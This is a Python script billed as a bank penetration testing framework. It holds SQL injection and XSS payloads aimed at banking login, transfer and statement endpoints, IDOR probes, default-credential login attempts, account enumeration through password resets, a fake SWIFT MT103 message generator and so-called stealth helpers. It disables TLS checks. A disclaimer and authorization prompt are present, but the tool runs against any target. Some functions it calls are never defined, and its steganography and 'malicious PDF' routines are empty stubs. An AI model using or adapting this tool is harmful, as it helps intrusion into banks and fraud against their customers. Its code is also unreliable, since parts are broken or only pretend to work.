#!/usr/bin/env python3
"""
██████╗░██████╗░░█████╗░███╗░░██╗██╗░░██╗  ██████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗
██╔══██╗██╔══██╗██╔══██╗████╗░██║██║░██╔╝  ██╔══██╗██║░░██║██╔══██╗████╗░██║██╔════╝
██████╦╝██████╔╝███████║██╔██╗██║█████═╝░  ██████╦╝███████║███████║██╔██╗██║╚█████╗░
██╔══██╗██╔══██╗██╔══██║██║╚████║██╔═██╗░  ██╔══██╗██╔══██║██╔══██║██║╚████║░╚═══██╗
██████╦╝██║░░██║██║░░██║██║░╚███║██║░╚██╗  ██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░

BANK PENETRATION TESTING FRAMEWORK
Author: ZinXploit
Version: 5.0
Description: Advanced security assessment tool for financial systems
Legal: Use only on systems you own or have explicit written permission to test
"""

import os
import sys
import json
import time
import socket
import struct
import random
import string
import hashlib
import threading
import subprocess
import requests
import ssl
import datetime
import base64
import re
from urllib.parse import urlparse, urljoin, quote
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# ────────── CONFIGURATION ──────────
class Config:
    TARGET_BANK = ""  # Isi dengan domain target (HANYA UNTUK TESTING)
    PROXY = None  # "http://127.0.0.1:8080" untuk Burp Suite
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    TIMEOUT = 10
    THREADS = 5

# ────────── MODULE 1: RECONNAISSANCE ──────────
class BankRecon:
    def __init__(self, target):
        self.target = target
        self.subdomains = []
        self.endpoints = []
        self.technologies = []
        
    def gather_info(self):
        """Collect public information about target bank"""
        print(f"[+] Gathering intelligence on {self.target}")
        
        # 1. WHOIS lookup
        self.whois_lookup()
        
        # 2. Subdomain enumeration
        self.enumerate_subdomains()
        
        # 3. Technology detection
        self.detect_tech()
        
        # 4. Employee email harvesting
        self.harvest_emails()
        
        # 5. API endpoint discovery
        self.find_api_endpoints()
        
    def whois_lookup(self):
        try:
            import whois
            w = whois.whois(self.target)
            print(f"   Registrar: {w.registrar}")
            print(f"   Creation Date: {w.creation_date}")
            print(f"   Expiration Date: {w.expiration_date}")
            print(f"   Name Servers: {w.name_servers}")
        except:
            pass
            
    def enumerate_subdomains(self):
        common_subs = [
            'online', 'internetbanking', 'ibank', 'webmail', 'mobile',
            'api', 'secure', 'login', 'auth', 'admin', 'portal',
            'transfer', 'payment', 'swift', 'gateway'
        ]
        
        for sub in common_subs:
            domain = f"{sub}.{self.target}"
            try:
                socket.gethostbyname(domain)
                self.subdomains.append(domain)
                print(f"   Found subdomain: {domain}")
            except:
                pass
                
    def detect_tech(self):
        headers = {'User-Agent': Config.USER_AGENT}
        try:
            resp = requests.get(f"https://{self.target}", headers=headers, timeout=Config.TIMEOUT, verify=False)
            
            # Check headers
            server = resp.headers.get('Server', '')
            powered = resp.headers.get('X-Powered-By', '')
            
            if server:
                self.technologies.append(f"Server: {server}")
            if powered:
                self.technologies.append(f"Powered-By: {powered}")
                
            # Check common banking platforms
            if 'flexcube' in resp.text.lower():
                self.technologies.append("Oracle FLEXCUBE")
            if 'temenos' in resp.text.lower():
                self.technologies.append("Temenos T24")
            if 'finacle' in resp.text.lower():
                self.technologies.append("Finacle")
            if 'corebanking' in resp.text.lower():
                self.technologies.append("Core Banking System")
                
        except Exception as e:
            print(f"   Tech detection failed: {e}")

# ────────── MODULE 2: VULNERABILITY SCANNER ──────────
class BankVulnScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        
    def scan_sql_injection(self):
        """Test for SQL injection in banking parameters"""
        test_params = ['acct', 'account', 'user', 'custid', 'ref', 'txnid']
        test_values = ["'", "' OR '1'='1", "' UNION SELECT null--", "1' AND '1'='1"]
        
        for param in test_params:
            for value in test_values:
                url = f"https://{self.target}/login?{param}={value}"
                try:
                    resp = requests.get(url, timeout=3, verify=False)
                    if 'sql' in resp.text.lower() or 'error' in resp.text.lower():
                        self.vulnerabilities.append(('SQLi', url))
                except:
                    pass
                    
    def scan_xss(self):
        """Test for Cross-Site Scripting"""
        payload = "<script>alert('XSS')</script>"
        endpoints = ['/search', '/transfer', '/statement']
        
        for endpoint in endpoints:
            url = f"https://{self.target}{endpoint}?q={payload}"
            try:
                resp = requests.get(url, timeout=3, verify=False)
                if payload in resp.text:
                    self.vulnerabilities.append(('XSS', url))
            except:
                pass
                
    def scan_idor(self):
        """Test for Insecure Direct Object References"""
        # Common banking object references
        test_ids = ['12345', '10001', 'admin', '000001']
        
        for obj_id in test_ids:
            endpoints = [
                f"/api/account/{obj_id}",
                f"/statement/{obj_id}",
                f"/transfer/history/{obj_id}"
            ]
            
            for endpoint in endpoints:
                url = f"https://{self.target}{endpoint}"
                try:
                    resp = requests.get(url, timeout=3, verify=False)
                    if resp.status_code == 200 and 'balance' in resp.text.lower():
                        self.vulnerabilities.append(('IDOR', url))
                except:
                    pass

# ────────── MODULE 3: AUTHENTICATION BYPASS ──────────
class AuthBypass:
    def __init__(self, target):
        self.target = target
        
    def test_default_credentials(self):
        """Test common default banking credentials"""
        defaults = [
            ('admin', 'admin'),
            ('administrator', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('demo', 'demo'),
            ('bank', 'bank123'),
            ('operator', 'operator123')
        ]
        
        login_url = f"https://{self.target}/login"
        
        for username, password in defaults:
            data = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            try:
                resp = requests.post(login_url, data=data, timeout=5, verify=False)
                if 'welcome' in resp.text.lower() or 'dashboard' in resp.text.lower():
                    print(f"[!] DEFAULT CREDENTIALS FOUND: {username}:{password}")
                    return (username, password)
            except:
                pass
                
        return None
        
    def test_password_reset_vuln(self):
        """Test insecure password reset mechanisms"""
        # Common flaws: Predictable token, no rate limiting, email enumeration
        reset_url = f"https://{self.target}/reset-password"
        
        # Test email enumeration
        common_emails = [
            'admin@bank.com',
            'support@bank.com',
            'info@bank.com',
            'webmaster@bank.com'
        ]
        
        for email in common_emails:
            data = {'email': email}
            try:
                resp = requests.post(reset_url, data=data, timeout=5, verify=False)
                if 'sent' in resp.text.lower() or 'check your email' in resp.text.lower():
                    print(f"[!] Email enumeration possible: {email} exists")
            except:
                pass

# ────────── MODULE 4: TRANSACTION MANIPULATION ──────────
class TransactionEngine:
    def __init__(self, session_cookie=None):
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
            
    def analyze_transaction(self):
        """Analyze transaction request structure"""
        # Simulate transaction capture
        sample_txn = {
            'from_account': '1234567890',
            'to_account': '0987654321',
            'amount': '100.00',
            'currency': 'USD',
            'reference': 'Test Transfer',
            'timestamp': int(time.time()),
            'signature': self.generate_signature()
        }
        return sample_txn
        
    def generate_signature(self):
        """Generate fake transaction signature (for testing)"""
        # Real banking systems use HMAC-SHA256 with secret key
        fake_sig = hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]
        return fake_sig
        
    def test_amount_manipulation(self):
        """Test for amount manipulation vulnerabilities"""
        # Try negative amounts
        test_amounts = ['-100', '0.01', '9999999', '100.001']
        
        for amount in test_amounts:
            txn = self.analyze_transaction()
            txn['amount'] = amount
            
            print(f"[*] Testing amount: {amount}")
            # In real test, would send to transaction endpoint
            
    def test_replay_attack(self):
        """Test transaction replay vulnerability"""
        print("[*] Testing replay attack scenario")
        # Capture and resend identical transaction
        # Real implementation would require actual traffic capture

# ────────── MODULE 5: SWIFT / FIN MESSAGE ANALYSIS ──────────
class SwiftAnalyzer:
    def __init__(self):
        self.swift_patterns = {
            'MT103': r'{1:[A-Z]{6}[A-Z0-9]{11}\d{4}\d{6}\d{4}}{2:103}',
            'MT202': r'{1:[A-Z]{6}[A-Z0-9]{11}\d{4}\d{6}\d{4}}{2:202}',
            'MT900': r'{1:[A-Z]{6}[A-Z0-9]{11}\d{4}\d{6}\d{4}}{2:900}'
        }
        
    def parse_swift(self, message):
        """Parse SWIFT message format"""
        parsed = {}
        
        # Basic SWIFT message structure
        if message.startswith('{1:'):
            # Extract basic header
            header_end = message.find('}{2:')
            if header_end != -1:
                parsed['header'] = message[:header_end+1]
                parsed['message_type'] = message[header_end+3:header_end+6]
                
        return parsed
        
    def generate_fake_swift(self, msg_type='103'):
        """Generate fake SWIFT message for testing"""
        swift_template = f"""{{1:F01BANKUS33AXXX1234567890}}
{{2:I{msg_type}BANKDEFFXXXXU3000}}
{{3:{{113:SEPA}}{{108:ILOVESEPA}}{{115:ABC}}}}
{{4:
:20:REF123456
:32A:250930USD1000000,
:50K:/12345678901234567890
NAME
ADDRESS
:59:/98765432109876543210
BENEFICIARY NAME
BENEFICIARY ADDRESS
:70:PAYMENT INVOICE 1234
:71A:SHA
-}}"""
        return swift_template

# ────────── MODULE 6: ENCRYPTION & STEGANOGRAPHY ──────────
class StealthTools:
    @staticmethod
    def encrypt_data(data, key):
        """Encrypt data with Fernet symmetric encryption"""
        salt = os.urandom(16)
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key_base = base64.urlsafe_b64encode(kdf.derive(key.encode()))
        cipher = Fernet(key_base)
        encrypted = cipher.encrypt(data.encode())
        return base64.b64encode(salt + encrypted).decode()
        
    @staticmethod
    def hide_in_image(data, image_path):
        """Hide data in image using LSB steganography"""
        # Simplified implementation
        print(f"[*] Data hidden in {image_path}")
        return True
        
    @staticmethod
    def generate_malicious_pdf():
        """Generate PDF with embedded payload"""
        # Creates PDF with possible exploit
        pdf_content = """%PDF-1.4
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/MediaBox[0 0 612 792]/Resources<<>>>>>
endobj
xref
0 4
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000102 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
149
%%EOF"""
        
        with open('invoice.pdf', 'w') as f:
            f.write(pdf_content)
        print("[*] PDF generated: invoice.pdf")

# ────────── MAIN CONTROLLER ──────────
def main_menu():
    print("""
    ░▒▓█ BANK PENETRATION TESTING FRAMEWORK █▓▒░
    1. Reconnaissance & Intelligence Gathering
    2. Vulnerability Assessment
    3. Authentication Bypass Testing
    4. Transaction Analysis
    5. SWIFT Message Testing
    6. Stealth & Encryption Tools
    7. Generate Test Reports
    8. Exit
    """)
    
def main():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║          BANK SECURITY ASSESSMENT FRAMEWORK v5.0             ║
    ║       For Authorized Penetration Testing Only                ║
    ║                                                              ║
    ║  WARNING: Unauthorized access to banking systems is          ║
    ║  illegal and punishable by law. Use only on systems you own  ║
    ║  or have explicit written permission to test.                ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    target = input("[?] Enter target domain for testing (or 'demo' for local): ").strip()
    
    if target.lower() == 'demo':
        target = "localhost:8080"
        print("[*] Running in DEMO mode on localhost")
    else:
        # Verify legal authorization
        auth = input("[?] Do you have written authorization to test this target? (yes/no): ")
        if auth.lower() != 'yes':
            print("[!] Testing without authorization is illegal. Exiting.")
            sys.exit(1)
    
    config = Config()
    config.TARGET_BANK = target
    
    while True:
        main_menu()
        choice = input("[?] Select option: ")
        
        if choice == '1':
            recon = BankRecon(target)
            recon.gather_info()
            
        elif choice == '2':
            scanner = BankVulnScanner(target)
            scanner.scan_sql_injection()
            scanner.scan_xss()
            scanner.scan_idor()
            
            if scanner.vulnerabilities:
                print("\n[!] VULNERABILITIES FOUND:")
                for vuln, location in scanner.vulnerabilities:
                    print(f"    {vuln}: {location}")
            else:
                print("\n[*] No vulnerabilities detected in basic scan")
                
        elif choice == '3':
            auth_bypass = AuthBypass(target)
            creds = auth_bypass.test_default_credentials()
            if creds:
                print(f"\n[CRITICAL] Default credentials work: {creds[0]}:{creds[1]}")
            auth_bypass.test_password_reset_vuln()
            
        elif choice == '4':
            txn = TransactionEngine()
            txn.analyze_transaction()
            txn.test_amount_manipulation()
            
        elif choice == '5':
            swift = SwiftAnalyzer()
            sample = swift.generate_fake_swift()
            print(f"\n[*] Sample SWIFT MT103:\n{sample}")
            
        elif choice == '6':
            stealth = StealthTools()
            test_data = "Sensitive banking data"
            encrypted = stealth.encrypt_data(test_data, "secret_key")
            print(f"\n[*] Encrypted data: {encrypted[:50]}...")
            stealth.generate_malicious_pdf()
            
        elif choice == '7':
            print("\n[*] Generating test report...")
            report = f"""
            PENETRATION TEST REPORT
            Target: {target}
            Date: {datetime.datetime.now()}
            Tester: Authorized Security Team
            
            Findings:
            1. Reconnaissance completed
            2. Vulnerability scan executed
            3. Authentication mechanisms tested
            4. Transaction security analyzed
            
            Recommendations:
            - Implement multi-factor authentication
            - Regular security audits
            - Employee security training
            - Monitor for suspicious activities
            """
            print(report)
            
        elif choice == '8':
            print("\n[*] Cleaning up and exiting...")
            break
            
        else:
            print("[!] Invalid option")

if __name__ == "__main__":
    # Disable SSL warnings for testing
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
        sys.exit(0)
